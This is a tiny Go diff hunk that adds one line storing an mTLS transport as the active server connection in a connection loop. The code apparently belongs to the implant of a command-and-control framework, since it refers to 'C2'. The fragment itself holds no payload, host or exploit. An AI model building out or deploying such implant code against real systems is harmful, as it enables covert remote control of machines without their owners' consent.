@@ -135,6 +135,7 @@ func StartConnectionLoop() *Connection {
 		case "mtls":
 			transport, err := newTransportMTLS(uri)
 			if err == nil {
+				ServerComms = transport
 				connection = transport.C2
 				return connection
 			}
